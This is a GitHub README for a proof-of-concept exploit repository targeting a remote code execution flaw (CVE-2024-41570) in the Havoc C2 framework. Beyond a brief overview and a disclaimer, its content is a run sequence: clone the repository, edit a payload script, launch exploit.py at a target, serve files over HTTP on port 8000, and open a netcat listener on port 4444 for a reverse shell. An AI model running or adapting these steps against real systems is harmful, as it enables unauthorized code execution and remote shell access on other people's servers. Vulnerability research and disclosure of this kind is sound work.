# Authenticated Havoc-Chained-RCE (CVE-2024-41570)

![GitHub](https://img.shields.io/github/license/dxlerYT/Havoc-C2-RCE-2024?style=flat-square)
![GitHub last commit](https://img.shields.io/github/last-commit/dxlerYT/Havoc-C2-RCE-2024?style=flat-square)
![GitHub issues](https://img.shields.io/github/issues/dxlerYT/Havoc-C2-RCE-2024?style=flat-square)

A proof-of-concept (PoC) [click here](https://github.com/chebuya/Havoc-C2-SSRF-poc)

## Overview

This repository contains a proof-of-concept (PoC) exploit for a Remote Code Execution (RCE) vulnerability discovered in Havoc C2 in 2024. The exploit demonstrates how an attacker could potentially execute arbitrary code on a target system running a vulnerable version of Havoc C2.

**Note:** This project is intended for educational and research purposes only. Do not use this code for malicious purposes.


## Installation

To use this PoC, follow these steps:

1. **Clone the repository:**
   ```bash
   git clone https://github.com/dxlerYT/Havoc-C2-RCE-2024.git
   cd Havoc-C2-RCE-2024
   Edit payload.sh
   sudo python3 exploit.py --target https://$IP -i 127.0.0.1 -p 40056
   python3 -m http.server 8000
   nc -nvlp 4444
   ```
